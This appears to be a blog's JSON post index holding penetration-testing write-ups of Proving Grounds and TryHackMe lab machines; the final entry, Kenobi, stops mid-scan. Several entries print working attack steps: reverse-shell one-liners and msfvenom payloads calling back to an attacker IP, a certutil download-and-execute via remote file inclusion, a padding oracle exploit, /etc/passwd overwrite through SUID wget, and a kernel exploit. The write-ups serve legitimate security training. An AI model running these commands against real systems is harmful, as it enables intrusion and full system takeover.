[ { "title": "Vector - PG", "url": "/posts/PG-Vector/", "categories": "Writeups, Proving Grounds", "tags": "PG, Padding Oracle Attack", "date": "2022-01-22 04:43:14 +0000", "snippet": "Recon &amp; Enumeration# autoreconnmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 192.168.157.119PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 127 Microsoft ftpd| ftp-syst: |_ SYST: Windows_NT80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn't have a title (text/html; charset=utf-8).| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn445/tcp open microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds2290/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn't have a title (text/html; charset=utf-8).| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE3389/tcp open ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services| ssl-cert: Subject: commonName=vector| Issuer: commonName=vector| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-09-20T18:21:33| Not valid after: 2022-03-22T18:21:33| MD5: 9f9a 1f6b 3f7b 3178 b7d0 1aa5 9df4 25ad| SHA-1: 4254 3770 1d9d dcd2 0886 be7f b28d b6b6 2a3f 8c6a| -----BEGIN CERTIFICATE-----| MIIC0DCCAbigAwIBAgIQeYu1RKPBi5ZGlb45mRn2PzANBgkqhkiG9w0BAQsFADAR &lt;--SNIP--&gt;| Q4Q5C6rGKL/lLtDEeden9m3tL+GXfLphsxqo6xmaWhW3yZ8oKhi7stxEHWvxeWU1| /yO+PQ==|_-----END CERTIFICATE-----|_ssl-date: 2022-01-21T19:05:31+00:00; 0s from scanner time.| rdp-ntlm-info: | Target_Name: VECTOR| NetBIOS_Domain_Name: VECTOR| NetBIOS_Computer_Name: VECTOR| DNS_Domain_Name: vector| DNS_Computer_Name: vector| Product_Version: 10.0.17763|_ System_Time: 2022-01-21T19:04:51+00:005985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found Visit http://192.168.157.119:2290/default.aspx Check comments:AES-256-CBC-PKCS7 ciphertext: 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488\t\tVictor's TODO: Need to add authentication eventually..Exploitation Google: AES-256-CBC-PKCS7 ciphertext decrypt Google: AES-256-CBC-PKCS7 ciphertext exploit Padding Oracle AttackPadding Oracle Attackpython3 exploit.py -c 4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488 -l 16 --host 192.168.157.119:2290 -u '/default.aspx?c=' --error '&lt;span id=\"MyLabel\"&gt;0&lt;/span&gt;'[+] Search value block : 1[+] Found 1 bytes : 04[+] Found 2 bytes : 0404[+] Found 3 bytes : 040404[+] Found 4 bytes : 04040404[+] Found 5 bytes : 3704040404[+] Found 6 bytes : 743704040404[+] Found 7 bytes : 61743704040404[+] Found 8 bytes : 5661743704040404[+] Found 9 bytes : 655661743704040404[+] Found 10 bytes : 6f655661743704040404[+] Found 11 bytes : 6c6f655661743704040404[+] Found 12 bytes : 416c6f655661743704040404[+] Found 13 bytes : 6d416c6f655661743704040404[+] Found 14 bytes : 726d416c6f655661743704040404[+] Found 15 bytes : 6f726d416c6f655661743704040404[+] Found 16 bytes : 576f726d416c6f655661743704040404[+] Decrypted value (HEX): 576F726D416C6F655661743704040404[+] Decrypted value (ASCII): WormAloeVat7 WormAloeVat7 We also have a username from TODO note in the comments: Victor Victor:WormAloeVat7 RDP using these credentialsPrivilege Escalation There is a backup.rar encrypted file in Users/victor/Downloads Start SMBServer and copy the file over to Kali copy ./backup.rar \\\\192.168.49.157\\share\\ For whatever reason that didn’t work. But there was FTP running on the box and I was able to log in using the same credentials we got. So I copied that file to C:\\FTPRoot and logged in via FTP on Kali to get the file ftp 192.168.157.119 21 =&gt; victor:WormAloeVat7 binary to set binary mode get backup.rar to downloadExtract the RAR Fileunrar e backup.rarEnter password for backup.rar: WormAloeVat7Extracting from backup.rarExtracting backup.txt OK cat backup.txtQWRtaW5pc3RyYXRvcjpFdmVyeXdheUxhYmVsV3JhcDM3NQ== cat backup.txt | base64 -d Administrator:EverywayLabelWrap375 Log out and RDP again into the machine, this time as the AdministratorC:\\Users\\Administrator\\Desktop&gt;whoami &amp;&amp; hostname &amp;&amp; ipconfig | findstr IPv4 &amp;&amp; type proof.txtvector\\administratorvector IPv4 Address. . . . . . . . . . . : 192.168.157.119668ac83fd9c03503c34f00b0e4da3aC:\\Users\\Administrator\\Desktop&gt;" }, { "title": "XposedAPI - PG", "url": "/posts/PG-XposedAPI/", "categories": "Writeups, Proving Grounds", "tags": "PG, API, SUID, wget", "date": "2022-01-16 01:37:10 +0000", "snippet": "Recon &amp; Enumeration# autoreconnmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 192.168.123.134PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r| 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=| 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+13337/tcp open http syn-ack ttl 63 Gunicorn 20.0.4|_http-title: Remote Software Management API| http-methods: |_ Supported Methods: GET OPTIONS HEAD|_http-server-header: gunicorn/20.0.4Aggressive OS guesses: Linux 2.6.32 (91%), Linux 2.6.32 or 3.10 (91%), Linux 2.6.39 (91%), Linux 3.10 - 3.12 (91%)Exploitation http://192.168.123.134:13337/logs WAF: Access Denied for this Host. Google: WAF Access Denied for this Host bypass https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c X-Forwarded-For:127.0.0.1 headerGET /logs?file=/etc/passwd HTTP/1.1Host: 192.168.123.134:13337X-Forwarded-For: 127.0.0.1User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1DNT: 1Sec-GPC: 1root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;--SNIP--&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinclumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh We get the username: clumsyadmin Now our POST request works and we get a shell as user clumsyadmin once we restart the app by visiting /restartmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.123 LPORT=22 -f elf -o shellpython3 -m http.server 80nc -lvnp 22POST /update HTTP/1.1Host: 192.168.123.134:13337User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeDNT: 1Sec-GPC: 1Cache-Control: max-age=0Content-Type: application/jsonContent-Length: 60{\"user\":\"clumsyadmin\", \"url\":\"http://192.168.49.123/shell\"} Privilege Escalation find / -perm -4000 2&gt;/dev/null Privilege Escalation with wget SUID wget has SUID bit set so we can use that to edit and replace /etc/passwd file with password for root user Download the /etc/passwd file from the target and add some password hash for root user openssl passwd pass123 =&gt; Xh/bM.jezOXCo wget 192.168.49.123/passwd -O /etc/passwd su root =&gt; pass123 whoami =&gt; rootroot@xposedapi:~# whoami &amp;&amp; hostname &amp;&amp; id &amp;&amp; ifconfig | grep inet &amp;&amp; cat proof.txtrootxposedapiuid=0(root) gid=0(root) groups=0(root) inet 192.168.123.134 netmask 255.255.255.0 broadcast 192.168.123.255 inet 127.0.0.1 netmask 255.0.0.0a82b28951444346478fab645553f55" }, { "title": "ZenPhoto - PG", "url": "/posts/PG-ZenPhoto/", "categories": "Writeups, Proving Grounds", "tags": "PG, ZenPhoto, RDS, Kernel Exploit", "date": "2022-01-15 17:32:44 +0000", "snippet": "Recon &amp; Enumeration# autoreconnmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 192.168.123.41PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)|_ 2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)23/tcp open ipp CUPS 1.4|_http-server-header: CUPS/1.4| http-methods: | Supported Methods: GET HEAD OPTIONS POST PUT|_ Potentially risky methods: PUT|_http-title: 403 Forbidden80/tcp open http Apache httpd 2.2.14 ((Ubuntu))|_http-server-header: Apache/2.2.14 (Ubuntu)|_http-title: Site doesn't have a title (text/html).| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS3306/tcp open mysql MySQL (unauthorized)|_ssl-cert: ERROR: Script execution failed (use -d to debug)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.2.0 (95%), Linux 2.6.32 (93%), Linux 2.6.35 (93%)Ffufffuf -u http://192.168.123.41/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -t 40 test [Status: 301, Size: 315, Words: 20, Lines: 10] http://192.168.123.41/test/ Powered by zenPHOTO Google: zenphoto https://github.com/zenphoto/zenphoto This gives us the directory structure so now we can go through files and check for any files with sensitive information, version number, etc to aid in further enumeration If we view the source for http://192.168.123.41/test/ and search for version or scroll to the bottom, we see version number mentioned there&lt;!-- zenphoto version 1.4.1.4 [8157] (Official Build) THEME: default (index.php) GRAPHICS LIB: PHP GD library 2.0 { memory: 128M } PLUGINS: class-video colorbox deprecated-functions hitcounter security-logger tiny_mce zenphoto_news zenphoto_sendmail zenphoto_seo --&gt; http://192.168.123.41/test/robots.txtDisallow: /test/albums/Disallow: /test/cache/Disallow: /test/themes/Disallow: /test/zp-core/Disallow: /test/zp-data/Disallow: /test/page/search/Disallow: /test/uploaded/Exploitation searchsploit zenphoto ZenPhoto 1.4.1.4 - ‘ajax_create_folder.php’ Remote Code Execution php 18083.php 192.168.123.41 /test/ whoami =&gt; www-data curl 192.168.49.123/shell.php -o /var/www/test/shell.php We do not have write access to the web root directory This shell was very restricted so I got another proper reverse shell with netcat nc -lvnp 23 - since port 23 was also open on the target Then run the following reverse shell one liner from the PHP shell we have:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.49.123 23 &gt;/tmp/fPrivilege Escalation There is MySQL running on this machine as we know from our nmap scan so I started looking for files with MySQL credentials cat /var/www/test/zp-data/zp-config.php# zp-data/zp-config.php$conf['mysql_user'] = 'root';$conf['mysql_pass'] = 'hola';$conf['mysql_host'] = 'localhost';$conf['mysql_database'] = 'zenphoto';mysql&gt; select id, user, name, pass from zp_administrators;+----+----------------+----------+------------------------------------------+| id | user | name | pass |+----+----------------+----------+------------------------------------------+| 1 | administrators | group | NULL || 2 | viewers | group | NULL || 3 | bozos | group | NULL || 4 | album managers | template | NULL || 5 | default | template | NULL || 6 | newuser | template | NULL || 7 | admin | admin | 63e5c2e178e611b692b526f8b6332317f2ff5513 |+----+----------------+----------+------------------------------------------+ Could not crack that hash so moved on to kernel exploits since this kernel version is really old uname -a =&gt; Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux LinPEAS suggested RDS kernel exploit and dirtycow Reliable Datagram Sockets (RDS) Linux Privilege Escalation (Linux Kernel 2.6.30 &lt; 2.6.36-rc8)Possible Exploits:[+] [CVE-2010-3904] rds Details: http://www.securityfocus.com/archive/1/514379 Exposure: highly probable Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ] Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c wget 192.168.49.123/linux-rds-exploit.c -P /dev/shm/www-data@offsecsrv:/dev/shm$ gcc linux-rds-exploit.c -o rds-exploitwww-data@offsecsrv:/dev/shm$ chmod +x rds-exploitwww-data@offsecsrv:/dev/shm$ ./rds-exploit[*] Linux kernel &gt;= 2.6.30 RDS socket exploit[*] by Dan Rosenberg[*] Resolving kernel addresses... [+] Resolved rds_proto_ops to 0xf821d980 [+] Resolved rds_ioctl to 0xf8217090 [+] Resolved commit_creds to 0xc016dcc0 [+] Resolved prepare_kernel_cred to 0xc016e000[*] Overwriting function pointer...[*] Triggering payload...[*] Restoring function pointer...[*] Got root!# whoamirootroot@offsecsrv:/root# whoami &amp;&amp; hostname &amp;&amp; ifconfig | grep inet &amp;&amp; cat proof.txtrootoffsecsrv inet addr:192.168.123.41 Bcast:192.168.123.255 Mask:255.255.255.0 inet6 addr: fe80::250:56ff:feba:b881/64 Scope:Link inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host4444cb0a0a33ab90abc85d121d2554" }, { "title": "Slort - PG", "url": "/posts/PG-Slort/", "categories": "Writeups, Proving Grounds", "tags": "PG, LFI, RFI, Windows", "date": "2022-01-02 23:58:30 +0000", "snippet": "Recon &amp; Enumeration nmap -Pn -p- -A 192.168.174.53PORT STATE SERVICE VERSION21/tcp open ftp FileZilla ftpd 0.9.41 beta| ftp-syst: |_ SYST: UNIX emulated by FileZilla135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3306/tcp open mysql?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, TerminalServerCookie, WMSRequest, X11Probe: |_ Host '192.168.49.174' is not allowed to connect to this MariaDB server4443/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6| http-title: Welcome to XAMPP|_Requested resource was http://192.168.174.53:4443/dashboard/5040/tcp open unknown7680/tcp open pando-pub?8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6| http-title: Welcome to XAMPP|_Requested resource was http://192.168.174.53:8080/dashboard/49664/tcp open unknown49665/tcp open unknown49667/tcp open unknown49668/tcp open unknown49669/tcp open unknown1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=12/20%Time=5FDF606F%P=x86_64-pc-linux-gnu%r(NSF:ULL,4C,\"H\\0\\0\\x01\\xffj\\x04Host\\x20'192\\.168\\.49\\.78'\\x20is\\x20not\\x20al&lt;-SNIP-&gt;SF:r\")%r(WMSRequest,4C,\"H\\0\\0\\x01\\xffj\\x04Host\\x20'192\\.168\\.49\\.68'\\x20isSF:\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\"SF:);Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2020-12-20T14:32:43|_ start_date: N/AGoBustergobuster dir -u http://192.168.174.53:4443/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50/img (Status: 301) [Size: 345] [--&gt; http://192.168.174.53:4443/img/]/site (Status: 301) [Size: 346] [--&gt; http://192.168.174.53:4443/site/]/dashboard (Status: 301) [Size: 351] [--&gt; http://192.168.174.53:4443/dashboard/]=====================================================gobuster dir -u http://192.168.174.53:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50/img (Status: 301) [Size: 345] [--&gt; http://192.168.174.53:8080/img/]/site (Status: 301) [Size: 346] [--&gt; http://192.168.174.53:8080/site/]/dashboard (Status: 301) [Size: 351] [--&gt; http://192.168.174.53:8080/dashboard/] I actually got the same results on both ports and the content is exactly the same. Not really sure if one is proxy or something If you visit http://192.168.174.53:4443/site/, it redirects to http://192.168.174.53:4443/site/index.php?page=main.php If you visit http://192.168.174.53:8080/site/, it redirects to http://192.168.174.53:8080/site/index.php?page=main.phpExploitationLFI RFI If you haven’t noticed it already, there is a vulnerable looking parameter there: index.php?page=main.php so we will have to test it for LFI and RFIhttp://192.168.174.53:4443/site/index.php?page=main.phpffuf -u 'http://192.168.174.53:4443/site/index.php?page=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -fw 34 | grep -v '*passwd* \\| *passwd%00 \\| *shadow%00'ffuf -u 'http://192.168.174.53:4443/site/index.php?page=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -c -t 50 -fw 34C:/Users/Administrator/NTUser.dat [Status: 200, Size: 372, Words: 31, Lines: 5]C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 824, Words: 172, Lines: 22]PHP Info Page phpinfo.php http://192.168.174.53:4443/site/index.php?page=../dashboard/phpinfo.php http://192.168.174.53:8080/site/index.php?page=../dashboard/phpinfo.phpOther Could-Be-Important Findings C:\\xampp\\php\\logs\\php_error_log Then I tested for RFI with a text file and simple HTTP Python server and was able to confirm RFI Reverse Shell with RFI Remote File Inclusion PHP Windows Shell Add IP and Port It did not work with default directory so I got the directory from phpinfo.php file from our LFI earlier and then I got a reverse shell as user rupert$ip = \"192.168.49.174\";$port = \"445\";// $tmpdir = \"C:\\\\windows\\\\temp\";$tmpdir = \"C:\\\\xampp\\\\apache\"; python3 -m http.server nc -lvnp 445http://192.168.174.53:8080/site/index.php?page=http://192.168.49.174/winshell.php whoami =&gt; rupertAnother Method msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.174 LPORT=135 -f exe -o shell.exe cat pwn.php &lt;?php$exec = system('certutil.exe -urlcache -split -f \"http://192.168.49.174/shell.exe\" shell.exe', $val);?&gt;curl http://192.168.174.53:8080/site/index.php?page=http://192.168.49.174/pwn.php Then to execute the shell.exe file we transferred onto the target, edit it like below and send a curl request again or just visit that link in the browser cat pwn.php&lt;?php$exec = system('shell.exe', $val);?&gt;Privilege Escalation Backup directory in C:\\ looks interesting&gt; cd C:\\Backup&gt; dir01/02/2022 05:09 PM &lt;DIR&gt; .01/02/2022 05:09 PM &lt;DIR&gt; ..06/12/2020 06:45 AM 11,304 backup.txt06/12/2020 06:45 AM 73 info.txt01/02/2022 04:41 PM 7,168 TFTP.EXE06/23/2020 06:49 PM 73,802 TFTP.EXE.BAK 4 File(s) 92,347 bytes 2 Dir(s) 27,226,210,304 bytes free&gt; type info.txtRun every 5 minutes:C:\\Backup\\TFTP.EXE -i 192.168.234.57 get backup.txt It is automatically running every 5 minutes so we can try replacing it with our reverse shell. Check access and details with accesschk or sc qc msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.174 LPORT=135 -f exe -o shell.exe move TFTP.EXE TFTP.EXE.BAK - always take a backup of the original file copy C:\\Users\\rupert\\shell.exe TFTP.EXE nc -lvnp 135 whoami =&gt; slort\\administratorwhoami &amp;&amp; hostname &amp;&amp; ipconfig | findstr IPv4 &amp;&amp; type proof.txtslort\\administratorslort IPv4 Address. . . . . . . . . . . : 192.168.174.5339947eae21088415f145c9c626f9fa" }, { "title": "Tony The Tiger - THM", "url": "/posts/THM-TonyTheTiger/", "categories": "Writeups, TryHackMe", "tags": "THM, JBoss, Java, Deserialization", "date": "2021-12-21 14:24:21 +0000", "snippet": "Enumeration nmap -Pn -p- --min-rate 2000 -sV 10.10.62.36Not shown: 65518 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.7 ((Ubuntu))1090/tcp open java-rmi Java RMI1091/tcp open java-rmi Java RMI1098/tcp open java-rmi Java RMI1099/tcp open java-object Java Object Serialization3873/tcp open java-object Java Object Serialization4446/tcp open java-object Java Object Serialization4712/tcp open msdtc Microsoft Distributed Transaction Coordinator (error)4713/tcp open pulseaudio?5445/tcp open smbdirect?5455/tcp open apc-5455?5500/tcp open hotline?5501/tcp open tcpwrapped8009/tcp open ajp13 Apache Jserv (Protocol v1.3)8080/tcp open http Apache Tomcat/Coyote JSP engine 1.18083/tcp open http JBoss service httpdGoBustergobuster dir -u http://10.10.62.36/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 60 -x php,java,txt -k=======================================================================/images (Status: 301) [Size: 310] [==&gt; http://10.10.62.36/images/]/page (Status: 301) [Size: 308] [==&gt; http://10.10.62.36/page/]/categories (Status: 301) [Size: 314] [==&gt; http://10.10.62.36/categories/]/posts (Status: 301) [Size: 309] [==&gt; http://10.10.62.36/posts/]/css (Status: 301) [Size: 307] [==&gt; http://10.10.62.36/css/]/tags (Status: 301) [Size: 308] [==&gt; http://10.10.62.36/tags/]/js (Status: 301) [Size: 306] [==&gt; http://10.10.62.36/js/]/fonts (Status: 301) [Size: 309] [==&gt; http://10.10.62.36/fonts/]Exploitation http://10.10.62.36:8080/admin-console/ admin:admin worked and logged me in but I couldn’t find a way to upload anything so I went looking for exploits. There is an option to upload files like WAR, EAR, RAR, JAR in the Applications section in admin console but it didn’t work and I could not get a reverse shell. searchsploit JBoss Google: JBoss AS 6 exploit JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and Exploitation Tool git clone https://github.com/joaomatosf/jexboss Create venv and pip install -r requires.txt python jexboss.py -J admin:admin -u http://10.10.62.36:8080 -r 10.10.62.36:8080 -t And we get a shell as user cmnatic. To get a proper netcat shell, I tried the following command and then upgraded the shell to get a stable shell. nc -lvnp 443 shell&gt; bash -i &gt;&amp; /dev/tcp/10.17.2.57/443 0&gt;&amp;1Privilege Escalation /home/jboss has a file note with jboss user’s password in it. jboss:likeaboss su jboss =&gt; likeaboss sudo -l =&gt; /usr/bin/find GTFOBins: sudo find . -exec /bin/bash \\; -quit whoami =&gt; root JBoss Configuration Files Locationhttps://docs.jboss.org/jbossas/guides/installguide/r1/en/html/config-files.htmlcmnatic@thm-java-deserial:~/jboss/server/default$ cat conf/props/jmx-console-users.properties# A sample users.properties file for use with the UsersRolesLoginModuleadmin=admincmnatic@thm-java-deserial:~/jboss/server/default$ cat conf/props/jmx-console-roles.properties# A sample roles.properties file for use with the UsersRolesLoginModuleadmin=JBossAdmin,HttpInvoker cat /root/root.txtQkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y== Go to CyberChef and Base64 Decode with URL Safe option. BC77AC072EE30E3760806864E234C7CF zxcvbnm123456789" }, { "title": "Kenobi - THM", "url": "/posts/THM-Kenobi/", "categories": "Writeups, TryHackMe", "tags": "THM, ProFTPD, PATH", "date": "2021-11-20 21:03:29 +0000", "snippet": "Enumeration nmap -Pn -p- -A 10.10.114.180PORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack ttl 60 ProFTPD 1.3.522/tcp open ssh syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj| 256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8=| 256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi80/tcp open http syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html).| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 1 disallowed entry|_/admin.html111/tcp open rpcbind syn-ack ttl 60 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 2,3,4 2049/tcp nfs| 100003 2,3,4 2049/tcp6 nfs| 100003 2,3,4 2049/udp nfs| 100003 2,3,4 2049/udp6 nfs| 100005 1,2,3 44864/udp6 mountd| 100005 1,2,3 50049/tcp6 mountd| 100005 1,2,3 54921/tcp mountd| 100005 1,2,3 57249/udp mountd| 100021 1,3,4 34301/udp nlockmgr| 100021 1,3,4 42343/tcp nlockmgr| 100021 1,3,4 45217/tcp6 nlockmgr| 100021 1,3,4 52968/udp6 nlockmgr| 100227 2,3 2049/tcp nfs_acl| 100227 2,3 2049/tcp6 nfs_acl| 100227 2,3 2049/udp nfs_acl|_ 100227 2,3 2049/udp6 nfs_acl139/tcp open netbios-ssn syn-ack ttl 60 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn syn-ack ttl 60 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2049/tcp open nfs_acl syn-ack ttl 60 2-3 (RPC #100227)33291/tcp open mountd syn-ack ttl 60 1-3 (RPC #100005)36651/tcp open mountd syn-ack ttl 60 1-3 (RPC #100005)42343/tcp open nlockmgr syn-ack ttl 60 1-4 (RPC #100021)54921/tcp open mountd syn-ack ttl 60 1-3 (RPC #100005)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portOS fingerprint not ideal because: Missing a closed TCP port so results incompleteAggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%)Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-os-discovery:| OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: kenobi| NetBIOS computer name: KENOBI\\x00| Domain name: \\x00| FQDN: kenobi|_ System time: 2021-11-21T07:00:52-06:00| nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| Names:| KENOBI&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;| KENOBI&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;| 